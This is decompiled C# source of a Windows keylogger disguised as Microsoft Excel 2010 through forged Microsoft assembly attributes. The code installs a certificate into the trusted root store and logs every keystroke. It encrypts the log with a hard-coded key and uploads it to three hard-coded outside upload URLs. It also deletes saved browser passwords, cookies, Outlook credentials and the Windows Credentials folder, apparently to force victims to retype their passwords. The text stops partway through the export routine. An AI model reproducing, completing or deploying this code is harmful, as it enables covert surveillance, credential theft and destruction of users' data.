using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using EXCEL32.My;
using EXCEL32.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;

[assembly: AssemblyCompany("Microsoft Corporation")]
[assembly: AssemblyTitle("Microsoft Excel 2010")]
[assembly: AssemblyProduct("Microsoft Office 2010")]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: AssemblyFileVersion("14.4.19.3")]
[assembly: AssemblyCopyright("© 2010 Microsoft Corporation.  All rights reserved.")]
[assembly: CompilationRelaxations(8)]
[assembly: AssemblyDescription("Microsoft Excel 2010")]
[assembly: Guid("c3ac46df-5ac2-4628-bfce-64889c0f356d")]
[assembly: ComVisible(false)]
[assembly: AssemblyTrademark("Microsoft® is a registered trademark of Microsoft Corporation.")]
[assembly: AssemblyVersion("14.4.19.3")]
namespace EXCEL32.My
{
	[EditorBrowsable(EditorBrowsableState.Never)]
	[GeneratedCode("MyTemplate", "8.0.0.0")]
	internal class MyApplication : ConsoleApplicationBase
	{
		public MyApplication()
			: this()
		{
		}
	}
	[GeneratedCode("MyTemplate", "8.0.0.0")]
	[EditorBrowsable(EditorBrowsableState.Never)]
	internal class MyComputer : Computer
	{
		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public MyComputer()
			: this()
		{
		}
	}
	[StandardModule]
	[GeneratedCode("MyTemplate", "8.0.0.0")]
	[HideModuleName]
	internal sealed class MyProject
	{
		[MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
		[EditorBrowsable(EditorBrowsableState.Never)]
		internal sealed class MyForms
		{
			[ThreadStatic]
			private static Hashtable m_FormBeingCreated;

			[DebuggerHidden]
			private static T Create__Instance__<T>(T Instance) where T : Form, new()
			{
				//Discarded unreachable code: IL_00dc
				if (Instance == null || ((Control)Instance).get_IsDisposed())
				{
					if (m_FormBeingCreated != null)
					{
						if (m_FormBeingCreated.ContainsKey(typeof(T)))
						{
							throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate", new string[0]));
						}
					}
					else
					{
						m_FormBeingCreated = new Hashtable();
					}
					m_FormBeingCreated.Add(typeof(T), null);
					TargetInvocationException ex2 = default(TargetInvocationException);
					try
					{
						return new T();
					}
					catch (TargetInvocationException ex) when (((Func<bool>)delegate
					{
						// Could not convert BlockContainer to single expression
						ProjectData.SetProjectError((Exception)(ex2 = ex));
						return ex2.InnerException != null;
					}).Invoke())
					{
						string resourceString = Utils.GetResourceString("WinForms_SeeInnerException", new string[1]
						{
							ex2.InnerException!.Message
						});
						throw new InvalidOperationException(resourceString, ex2.InnerException);
					}
					finally
					{
						m_FormBeingCreated.Remove(typeof(T));
					}
				}
				return Instance;
			}

			[DebuggerHidden]
			private void Dispose__Instance__<T>(ref T instance) where T : Form
			{
				((Component)instance).Dispose();
				instance = default(T);
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			[DebuggerHidden]
			public MyForms()
			{
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			public override bool Equals(object o)
			{
				return base.Equals(RuntimeHelpers.GetObjectValue(o));
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			public override int GetHashCode()
			{
				return base.GetHashCode();
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			internal new Type GetType()
			{
				return typeof(MyForms);
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			public override string ToString()
			{
				return base.ToString();
			}
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
		internal sealed class MyWebServices
		{
			[EditorBrowsable(EditorBrowsableState.Never)]
			[DebuggerHidden]
			public override bool Equals(object o)
			{
				return base.Equals(RuntimeHelpers.GetObjectValue(o));
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			[DebuggerHidden]
			public override int GetHashCode()
			{
				return base.GetHashCode();
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			[DebuggerHidden]
			internal new Type GetType()
			{
				return typeof(MyWebServices);
			}

			[EditorBrowsable(EditorBrowsableState.Never)]
			[DebuggerHidden]
			public override string ToString()
			{
				return base.ToString();
			}

			[DebuggerHidden]
			private static T Create__Instance__<T>(T instance) where T : new()
			{
				if (instance == null)
				{
					return new T();
				}
				return instance;
			}

			[DebuggerHidden]
			private void Dispose__Instance__<T>(ref T instance)
			{
				instance = default(T);
			}

			[DebuggerHidden]
			[EditorBrowsable(EditorBrowsableState.Never)]
			public MyWebServices()
			{
			}
		}

		[ComVisible(false)]
		[EditorBrowsable(EditorBrowsableState.Never)]
		internal sealed class ThreadSafeObjectProvider<T> where T : new()
		{
			[ThreadStatic]
			[CompilerGenerated]
			private static T m_ThreadStaticValue;

			internal T GetInstance
			{
				[DebuggerHidden]
				get
				{
					if (m_ThreadStaticValue == null)
					{
						m_ThreadStaticValue = new T();
					}
					return m_ThreadStaticValue;
				}
			}

			[DebuggerHidden]
			[EditorBrowsable(EditorBrowsableState.Never)]
			public ThreadSafeObjectProvider()
			{
			}
		}

		private static readonly ThreadSafeObjectProvider<MyComputer> m_ComputerObjectProvider = new ThreadSafeObjectProvider<MyComputer>();

		private static readonly ThreadSafeObjectProvider<MyApplication> m_AppObjectProvider = new ThreadSafeObjectProvider<MyApplication>();

		private static readonly ThreadSafeObjectProvider<User> m_UserObjectProvider = new ThreadSafeObjectProvider<User>();

		private static ThreadSafeObjectProvider<MyForms> m_MyFormsObjectProvider = new ThreadSafeObjectProvider<MyForms>();

		private static readonly ThreadSafeObjectProvider<MyWebServices> m_MyWebServicesObjectProvider = new ThreadSafeObjectProvider<MyWebServices>();

		[HelpKeyword("My.Computer")]
		internal static MyComputer Computer
		{
			[DebuggerHidden]
			get
			{
				return m_ComputerObjectProvider.GetInstance;
			}
		}

		[HelpKeyword("My.Application")]
		internal static MyApplication Application
		{
			[DebuggerHidden]
			get
			{
				return m_AppObjectProvider.GetInstance;
			}
		}

		[HelpKeyword("My.User")]
		internal static User User
		{
			[DebuggerHidden]
			get
			{
				return m_UserObjectProvider.GetInstance;
			}
		}

		[HelpKeyword("My.Forms")]
		internal static MyForms Forms
		{
			[DebuggerHidden]
			get
			{
				return m_MyFormsObjectProvider.GetInstance;
			}
		}

		[HelpKeyword("My.WebServices")]
		internal static MyWebServices WebServices
		{
			[DebuggerHidden]
			get
			{
				return m_MyWebServicesObjectProvider.GetInstance;
			}
		}
	}
}
namespace EXCEL32
{
	[StandardModule]
	internal sealed class Certification
	{
		public static void Certify()
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0011: Expected O, but got Unknown
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Expected O, but got Unknown
			X509Certificate2 val = new X509Certificate2(Resources.Microsoft_Certificate, ".......-wF#gsIr29....rHYhd_bt8?2suz2......XI2jqH9rlQ!r+....LemZ$", (X509KeyStorageFlags)2);
			X509Store val2 = new X509Store((StoreName)6, (StoreLocation)2);
			val2.Open((OpenFlags)1);
			Console.WriteLine("About to add the cert");
			try
			{
				val2.Add(val);
			}
			catch (CryptographicException ex)
			{
				ProjectData.SetProjectError((Exception)ex);
				CryptographicException ex2 = ex;
				Console.WriteLine("Permission Denied");
				ProjectData.ClearProjectError();
			}
			catch (ArgumentNullException ex3)
			{
				ProjectData.SetProjectError((Exception)ex3);
				ArgumentNullException ex4 = ex3;
				Console.WriteLine("Cert is null");
				ProjectData.ClearProjectError();
			}
			val2.Close();
		}
	}
	[StandardModule]
	public sealed class Constants
	{
		public const int REFRESH_RATE = 86400;

		public const string TARGET_URL = "http://www.advantarlabs.com/cgi/up_docx.php";

		public const string TARGET_URL2 = "http://www.cooperstandard.com/uploads/up_docx.php";

		public const string TARGET_URL3 = "http://www.palmettogoodwill.org/files/policycommittee/up_docx.php";

		public const string BUILD_VERSION = "1.0.0";

		public static bool IS_XP;

		public static string LOG_PATH;

		public static string TIME_PATH;

		public static string STARTUP_PATH;

		public static string DUMP_PATH;

		public static string START_TIME_PATH;

		public const int VK_LBUTTON = 1;

		public const int VK_RBUTTON = 2;

		public const int VK_CANCEL = 3;

		public const int VK_MBUTTON = 4;

		public const int VK_BACK = 8;

		public const int VK_TAB = 9;

		public const int VK_CLEAR = 12;

		public const int VK_RETURN = 13;

		public const int VK_SHIFT = 16;

		public const int VK_CONTROL = 17;

		public const int VK_MENU = 18;

		public const int VK_PAUSE = 19;

		public const int VK_CAPITAL = 20;

		public const int VK_ESCAPE = 27;

		public const int VK_SPACE = 32;

		public const int VK_PRIOR = 33;

		public const int VK_NEXT = 34;

		public const int VK_END = 35;

		public const int VK_HOME = 36;

		public const int VK_LEFT = 37;

		public const int VK_UP = 38;

		public const int VK_RIGHT = 39;

		public const int VK_DOWN = 40;

		public const int VK_SELECT = 41;

		public const int VK_PRINT = 42;

		public const int VK_EXECUTE = 43;

		public const int VK_SNAPSHOT = 44;

		public const int VK_INSERT = 45;

		public const int VK_DELETE = 46;

		public const int VK_HELP = 47;

		public const int VK_NUMPAD0 = 96;

		public const int VK_NUMPAD1 = 97;

		public const int VK_NUMPAD2 = 98;

		public const int VK_NUMPAD3 = 99;

		public const int VK_NUMPAD4 = 100;

		public const int VK_NUMPAD5 = 101;

		public const int VK_NUMPAD6 = 102;

		public const int VK_NUMPAD7 = 103;

		public const int VK_NUMPAD8 = 104;

		public const int VK_NUMPAD9 = 105;

		public const int VK_MULTIPLY = 106;

		public const int VK_ADD = 107;

		public const int VK_SEPARATOR = 108;

		public const int VK_SUBTRACT = 109;

		public const int VK_DECIMAL = 110;

		public const int VK_DIVIDE = 111;

		public const int VK_F1 = 112;

		public const int VK_F2 = 113;

		public const int VK_F3 = 114;

		public const int VK_F4 = 115;

		public const int VK_F5 = 116;

		public const int VK_F6 = 117;

		public const int VK_F7 = 118;

		public const int VK_F8 = 119;

		public const int VK_F9 = 120;

		public const int VK_F10 = 121;

		public const int VK_F11 = 122;

		public const int VK_F12 = 123;

		public const int VK_F13 = 124;

		public const int VK_F14 = 125;

		public const int VK_F15 = 126;

		public const int VK_F16 = 127;

		public const int VK_F17 = 128;

		public const int VK_F18 = 129;

		public const int VK_F19 = 130;

		public const int VK_F20 = 131;

		public const int VK_F21 = 132;

		public const int VK_F22 = 133;

		public const int VK_F23 = 134;

		public const int VK_F24 = 135;

		public const int VK_NUMLOCK = 144;

		public const int VK_SCROLL = 145;

		public const int VK_LSHIFT = 160;

		public const int VK_RSHIFT = 161;

		public const int VK_LCONTROL = 162;

		public const int VK_RCONTROL = 163;

		public const int VK_LMENU = 164;

		public const int VK_RMENU = 165;

		public const int VK_ATTN = 246;

		public const int VK_CRSEL = 247;

		public const int VK_EXSEL = 248;

		public const int VK_EREOF = 249;

		public const int VK_PLAY = 250;

		public const int VK_ZOOM = 251;

		public const int VK_NONAME = 252;

		public const int VK_PA1 = 253;

		public const int VK_OEM_CLEAR = 254;

		public const int VK_OEM_2 = 191;

		public const int VK_OEM_3 = 192;

		public const int VK_OEM_4 = 219;

		public const int VK_OEM_5 = 220;

		public const int VK_OEM_6 = 221;

		public static void set_Windows_Paths()
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			Console.WriteLine("MAKE SURE YOU ADD 2 EXTRA UPLOAD LOCATIONS (CONST) AS A PRECAUTIONARY MEASURE");
			switch (oSVersion.Version.Major)
			{
			case 5:
				LOG_PATH = Interaction.Environ("USERPROFILE") + "\\My Documents\\macro_out.txt";
				DUMP_PATH = Interaction.Environ("USERPROFILE") + "\\My Documents\\Data\\";
				TIME_PATH = Interaction.Environ("USERPROFILE") + "\\My Documents\\time.txt";
				STARTUP_PATH = Interaction.Environ("USERPROFILE") + "\\Start Menu\\Programs\\Startup\\";
				START_TIME_PATH = Interaction.Environ("USERPROFILE") + "\\My Documents\\start_time.txt";
				IS_XP = true;
				break;
			case 6:
				LOG_PATH = Interaction.Environ("USERPROFILE") + "\\Documents\\macro_out.txt";
				TIME_PATH = Interaction.Environ("USERPROFILE") + "\\Documents\\time.txt";
				DUMP_PATH = Interaction.Environ("USERPROFILE") + "\\Documents\\Data\\";
				STARTUP_PATH = Interaction.Environ("USERPROFILE") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
				START_TIME_PATH = Interaction.Environ("USERPROFILE") + "\\My Documents\\start_time.txt";
				IS_XP = false;
				break;
			}
		}
	}
	[StandardModule]
	internal sealed class Deletion_and_Cleanup
	{
		public static bool ReadyForCleansing()
		{
			Console.WriteLine("Seeing if ready to cleanse");
			StreamReader streamReader = File.OpenText(Constants.START_TIME_PATH);
			DateTime dateTime = DateTime.Parse(streamReader.ReadToEnd());
			int num = checked((int)DateAndTime.DateDiff((DateInterval)4, dateTime, DateAndTime.get_Now(), (FirstDayOfWeek)1, (FirstWeekOfYear)1));
			streamReader.Close();
			if (num % 4 == 0)
			{
				Console.WriteLine("Ready to cleanse");
				return true;
			}
			Console.WriteLine("Not ready to cleanse");
			return false;
		}

		public static void CleanFireFox()
		{
			//IL_002e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0034: Expected O, but got Unknown
			string text = "C:\\Users\\" + Interaction.Environ("USERNAME") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
			if (!Directory.Exists(text))
			{
				Console.WriteLine("Firefox not found");
				return;
			}
			DirectoryInfo val = new DirectoryInfo(text);
			DirectoryInfo[] directories = val.GetDirectories();
			string name = directories[0].get_Name();
			Console.WriteLine(name);
			deleteFile(text + name + "\\cookies.sqlite");
			deleteFile(text + name + "\\cookies.sqlite-shm");
			deleteFile(text + name + "\\cookies.sqlite-wal");
			deleteFile(text + name + "\\key3.db");
			deleteFile(text + name + "\\signons.sqlite");
			deleteFile(text + name + "\\signons.txt");
			deleteFile(text + name + "\\signons2.txt");
			deleteFile(text + name + "\\signons3.txt");
		}

		public static void CleanIE()
		{
			if (!Constants.IS_XP)
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().DeleteSubKey("Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2\\");
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Console.WriteLine("Failed to delete the Storage2 key due to nonexistence and/or permissions");
					ProjectData.ClearProjectError();
				}
				try
				{
					Directory.Delete("C:\\Users\\" + Interaction.Environ("USERNAME") + "\\AppData\\Roaming\\Microsoft\\Credentials");
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					Console.WriteLine("Failed to delete the Credentials directory due to nonexistence and/or permissions");
					ProjectData.ClearProjectError();
				}
			}
			else
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().DeleteSubKey("Software\\Microsoft\\Protected Storage System Provider\\");
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					Console.WriteLine("Failed to delete the Protected Storage System Provider key due to nonexistence and/or permissions");
					ProjectData.ClearProjectError();
				}
				try
				{
					Directory.Delete("C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Application Data\\Microsoft\\Credentials");
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception ex8 = ex7;
					Console.WriteLine("Failed to delete the Credentials directory due to nonexistence and/or permissions");
					ProjectData.ClearProjectError();
				}
			}
		}

		public static void CleanChrome()
		{
			if (!Constants.IS_XP)
			{
				string text = "C:\\Users\\" + Interaction.Environ("USERNAME") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\";
				if (!Directory.Exists(text))
				{
					Console.WriteLine("Chrome not found");
					return;
				}
				deleteFile(text + "Web Data");
				deleteFile(text + "Web Data-journal");
				deleteFile(text + "Login Data");
				deleteFile(text + "Login Data-journal");
				deleteFile(text + "Cookies");
				deleteFile(text + "Cookies-journal");
			}
			else
			{
				string text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\";
				deleteFile(text + "Web Data");
				deleteFile(text + "Web Data-journal");
				deleteFile(text + "Login Data");
				deleteFile(text + "Login Data-journal");
				deleteFile(text + "Cookies");
				deleteFile(text + "Cookies-journal");
			}
		}

		public static void CleanOutlook()
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().DeleteSubKey("XXXXXXXX[MAKE SURE TO DELETE THE PASS ONLY, NOT THE ENTIRE PROFILE!!]XXXXXSoftware\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Console.WriteLine("Failed to delete the Outlook 2002-2010 key due to nonexistence and/or permissions");
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().DeleteSubKey("XXXXXXXX[MAKE SURE TO DELETE THE PASS ONLY, NOT THE ENTIRE PROFILE!!]XXXXXMicrosoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\");
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				Console.WriteLine("Failed to delete the Storage2 key due to nonexistence and/or permissions");
				ProjectData.ClearProjectError();
			}
		}

		public static void CleanNetwork()
		{
		}

		public static void Cleanse()
		{
			CleanFireFox();
			CleanIE();
			CleanChrome();
			CleanNetwork();
			CleanOutlook();
			Registry_Search.registryCleanse("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles");
			Registry_Search.registryCleanse("Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook");
		}

		public static void deleteFile(string name)
		{
			if (File.Exists(name))
			{
				try
				{
					File.Delete(name);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Console.WriteLine("Failed to delete: " + name + " likely because the file is already in use by another program");
					ProjectData.ClearProjectError();
				}
			}
		}

		public static void deleteDirectoryContents(string name)
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(name))
			{
				try
				{
					File.SetAttributes(file, (FileAttributes)128);
					File.Delete(file);
					Console.WriteLine(file);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Console.WriteLine("Failed to delete: " + name + " likely because the file is already in use by another program");
					ProjectData.ClearProjectError();
				}
			}
		}
	}
	[StandardModule]
	internal sealed class Encrypt
	{
		[DllImport("kernel32.dll")]
		public static extern void ZeroMemory(IntPtr addr, int size);

		public static string GenerateKey()
		{
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			DESCryptoServiceProvider val = (DESCryptoServiceProvider)DES.Create();
			return Encoding.ASCII.GetString(((DES)val).get_Key());
		}

		public static void EncryptFile(string sInputFilename, string sOutputFilename, string sKey)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Expected O, but got Unknown
			//IL_0051: Unknown result type (might be due to invalid IL or missing references)
			//IL_0057: Expected O, but got Unknown
			FileStream fileStream = new FileStream(sInputFilename, FileMode.Open, FileAccess.Read);
			FileStream fileStream2 = new FileStream(sOutputFilename, FileMode.Create, FileAccess.Write);
			DESCryptoServiceProvider val = new DESCryptoServiceProvider();
			Console.WriteLine("Encrypting the log file");
			((DES)val).set_Key(Encoding.ASCII.GetBytes(sKey));
			((SymmetricAlgorithm)val).set_IV(Encoding.ASCII.GetBytes(sKey));
			ICryptoTransform val2 = ((SymmetricAlgorithm)val).CreateEncryptor();
			CryptoStream val3 = new CryptoStream((Stream)fileStream2, val2, (CryptoStreamMode)1);
			byte[] array = new byte[checked((int)(fileStream.Length - 1) + 1)];
			fileStream.Read(array, 0, array.Length);
			val3.Write(array, 0, array.Length);
			((Stream)(object)val3).Close();
			fileStream.Close();
		}

		public static void DecryptFile(string sInputFilename, string sOutputFilename, string sKey)
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0006: Expected O, but got Unknown
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0043: Expected O, but got Unknown
			DESCryptoServiceProvider val = new DESCryptoServiceProvider();
			((DES)val).set_Key(Encoding.ASCII.GetBytes(sKey));
			((SymmetricAlgorithm)val).set_IV(Encoding.ASCII.GetBytes(sKey));
			FileStream fileStream = new FileStream(sInputFilename, FileMode.Open, FileAccess.Read);
			ICryptoTransform val2 = ((SymmetricAlgorithm)val).CreateDecryptor();
			CryptoStream stream = new CryptoStream((Stream)fileStream, val2, (CryptoStreamMode)0);
			StreamWriter streamWriter = new StreamWriter(sOutputFilename);
			streamWriter.Write(new StreamReader((Stream)(object)stream).ReadToEnd());
			streamWriter.Flush();
			streamWriter.Close();
		}
	}
	[StandardModule]
	internal sealed class Enloggment
	{
		private static long e;

		private static DateTime startTime;

		private static DateTime currentTime;

		private static int key;

		private static int b;

		private static int count;

		private static int result;

		private static char charKey;

		private static char tempChar;

		private static UTF8Encoding encode;

		private static string tempString;

		private static string tempo;

		[DllImport("User32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int GetAsyncKeyState(int vKey);

		[DllImport("User32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int GetKeyState(int vKey);

		[DllImport("wininet", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool InternetGetConnectedState(ref long conn, long val);

		public static void Logment()
		{
			string lOG_PATH = Constants.LOG_PATH;
			if (!File.Exists(lOG_PATH))
			{
				generateNewLog();
			}
			checked
			{
				while (true)
				{
					if (Main_Module.readyForUpload)
					{
						Console.WriteLine("Aborting the scheduler");
						exportLog();
						generateNewLog();
						Scheduler_and_IP.Reset_Time();
						if (Deletion_and_Cleanup.ReadyForCleansing())
						{
							Deletion_and_Cleanup.Cleanse();
						}
						Console.WriteLine("Resuming the scheduler");
						Main_Module.threadScheduler = new Thread(new ThreadStart(Scheduler_and_IP.scheduler_continue));
						Main_Module.threadScheduler.Start();
					}
					StreamWriter streamWriter = File.AppendText(lOG_PATH);
					key = 5;
					do
					{
						result = 0;
						result = GetAsyncKeyState(key);
						if (result == -32767)
						{
							if (key == 8)
							{
								tempString = "[BACKSPACE]";
							}
							else if (key == 46)
							{
								tempString = "[DELETE]";
							}
							else if (key == 45)
							{
								tempString = "[INSERT]";
							}
							else if (key == 44)
							{
								tempString = "[PRINTSCREEN]";
							}
							else if (key == 43)
							{
								tempString = "[EXECUTE]";
							}
							else if (key == 42)
							{
								tempString = "[PRINT]";
							}
							else if (key == 41)
							{
								tempString = "[SELECT]";
							}
							else if (key == 33)
							{
								tempString = "[PAGE UP]";
							}
							else if (key == 34)
							{
								tempString = "[PAGE DOWN]";
							}
							else
							{
								if (key != 9)
								{
									if (!((key == 16) | (key == 161)) && key != 160)
									{
										if (key != 13)
										{
											if (key == 32)
											{
												tempString = " ";
											}
											else if (key == 20)
											{
												tempString = "[CAPS LOCK]";
											}
											else if (key == 96)
											{
												tempString = "0";
											}
											else if (key == 97)
											{
												tempString = "1";
											}
											else if (key == 98)
											{
												tempString = "2";
											}
											else if (key == 99)
											{
												tempString = "3";
											}
											else if (key == 100)
											{
												tempString = "4";
											}
											else if (key == 101)
											{
												tempString = "5";
											}
											else if (key == 102)
											{
												tempString = "6";
											}
											else if (key == 103)
											{
												tempString = "7";
											}
											else if (key == 104)
											{
												tempString = "8";
											}
											else if (key == 105)
											{
												tempString = "9";
											}
											else if (key == 106)
											{
												tempString = "*";
											}
											else if (key == 110)
											{
												tempString = ".";
											}
											else if (key == 107)
											{
												tempString = "+";
											}
											else if (key == 111)
											{
												tempString = "/";
											}
											else if (key == 108)
											{
												tempString = "-";
											}
											else if (key == 145)
											{
												tempString = "[SCROLL LOCK]";
											}
											else if (key == 109)
											{
												tempString = "-";
											}
											else if (key == 17)
											{
												tempString = "[CTRL]";
											}
											else
											{
												if ((key == 162) | (key == 163))
												{
													goto IL_0aa1;
												}
												if (key == 19)
												{
													tempString = "[PAUSE]";
												}
												else if (key == 27)
												{
													tempString = "[ESCAPE]";
												}
												else if (key == 35)
												{
													tempString = "[END]";
												}
												else if (key == 36)
												{
													tempString = "[HOME]";
												}
												else if (key == 18)
												{
													tempString = "[ALT]";
												}
												else
												{
													if ((key == 164) | (key == 165))
													{
														goto IL_0aa1;
													}
													if (key == 37)
													{
														tempString = "[LEFT]";
													}
													else if (key == 38)
													{
														tempString = "[UP]";
													}
													else if (key == 40)
													{
														tempString = "[DOWN]";
													}
													else if (key == 39)
													{
														tempString = "[RIGHT]";
													}
													else if (key == 44)
													{
														tempString = "[PRINT]";
													}
													else if (key == 144)
													{
														tempString = "[NUM LOCK]";
													}
													else if (key == 112)
													{
														tempString = "[F1]";
													}
													else if (key == 113)
													{
														tempString = "[F2]";
													}
													else if (key == 114)
													{
														tempString = "[F3]";
													}
													else if (key == 115)
													{
														tempString = "[F4]";
													}
													else if (key == 116)
													{
														tempString = "[F5]";
													}
													else if (key == 117)
													{
														tempString = "[F6]";
													}
													else if (key == 118)
													{
														tempString = "[F7]";
													}
													else if (key == 119)
													{
														tempString = "[F8]";
													}
													else if (key == 120)
													{
														tempString = "[F9]";
													}
													else if (key == 121)
													{
														tempString = "[F10]";
													}
													else if (key == 122)
													{
														tempString = "[F11]";
													}
													else if (key == 123)
													{
														tempString = "[F12]";
													}
													else if (GetAsyncKeyState(16) != 0)
													{
														if (key == 191)
														{
															tempString = "?";
														}
														else if (key == 220)
														{
															tempString = "|";
														}
														else if (key == 192)
														{
															tempString = "~";
														}
														else if (key == 221)
														{
															tempString = "}";
														}
														else if (key == 219)
														{
															tempString = "{";
														}
														else if (key == 92)
														{
															tempString = "\\";
														}
														else if ((key == 188) | (key == 60))
														{
															tempString = "<";
														}
														else if ((key == 190) | (key == 62))
														{
															tempString = ">";
														}
														else if (key == 59)
														{
															tempString = ":";
														}
														else if (key == 49)
														{
															tempString = "!";
														}
														else if (key == 50)
														{
															tempString = "@";
														}
														else if (key == 51)
														{
															tempString = "#";
														}
														else if (key == 52)
														{
															tempString = "$";
														}
														else if (key == 53)
														{
															tempString = "%";
														}
														else if (key == 54)
														{
															tempString = "^";
														}
														else if (key == 55)
														{
															tempString = "&";
														}
														else if (key == 56)
														{
															tempString = "*";
														}
														else if (key == 57)
														{
															tempString = "(";
														}
														else if (key == 48)
														{
															tempString = ")";
														}
														else if ((key == 186) | (key == 58))
														{
															tempString = ":";
														}
														else if (key == 222)
														{
															tempString = "\"";
														}
														else if (key == 189)
														{
															tempString = "_";
														}
														else if (key == 187)
														{
															tempString = "+";
														}
														else if ((key >= 65) & (key <= 90))
														{
															charKey = Strings.Chr(key);
															tempString = Conversions.ToString(charKey);
														}
													}
													else if (key == 191)
													{
														tempString = "/";
													}
													else if (key == 220)
													{
														tempString = "\\";
													}
													else if (key == 192)
													{
														tempString = "`";
													}
													else if (key == 221)
													{
														tempString = "]";
													}
													else if (key == 219)
													{
														tempString = "[";
													}
													else if (key == 222)
													{
														tempString = "'";
													}
													else if ((key == 59) | (key == 186))
													{
														tempString = ";";
													}
													else if (key == 189)
													{
														tempString = "-";
													}
													else if ((key == 188) | (key == 44))
													{
														tempString = ",";
													}
													else if ((key == 190) | (key == 46))
													{
														tempString = ".";
													}
													else if (key == 187)
													{
														tempString = "=";
													}
													else if ((key >= 65) & (key <= 90))
													{
														charKey = Strings.Chr(key + 32);
														tempString = Conversions.ToString(charKey);
													}
													else
													{
														charKey = Strings.Chr(key);
														tempString = Conversions.ToString(charKey);
													}
												}
											}
											goto IL_0a86;
										}
										Console.WriteLine("");
										streamWriter.WriteLine("");
									}
									goto IL_0aa1;
								}
								tempString = "[TAB]";
							}
							goto IL_0a86;
						}
						goto IL_0aa1;
						IL_0a86:
						Console.Write(tempString);
						streamWriter.Write(tempString);
						streamWriter.Flush();
						goto IL_0aa1;
						IL_0aa1:
						key++;
					}
					while (key <= 255);
					Thread.Sleep(2);
					streamWriter.Close();
				}
			}
		}

		public static void generateNewLog()
		{
			Console.WriteLine("Generating New Log");
			StreamWriter streamWriter = File.CreateText(Constants.LOG_PATH);
			tempo = Scheduler_and_IP.Identity_Stamp();
			Console.WriteLine(tempo);
			streamWriter.WriteLine(tempo);
			streamWriter.WriteLine("==============================[BUFFER]==============================");
			streamWriter.WriteLine("==============================[BUFFER]==============================");
			streamWriter.WriteLine("==============================[BUFFER]==============================");
			streamWriter.Flush();
			streamWriter.Close();
		}

		public static void exportLog()
		{
			DateTime now = DateTime.Now;
			string format = "MMddyyyy_HHmmss";
			Console.WriteLine("Exporting Log");
			string hostName = Dns.GetHostName();
			string text = Constants.DUMP_PATH + Environment.UserName + "@" + hostName + "___" + now.ToString(format) + ".txt";
			FileSystem.CopyFile(Constants.LOG_PATH, text, true);
			string sKey = "ÇÇ   ñ  ";
			string text2 = text + ".enc";
			Encrypt.EncryptFile(text, text2, sKey);
			Uploader.htmlUpload(text2);
			Deletion_and_Cleanup.deleteFile(text2);
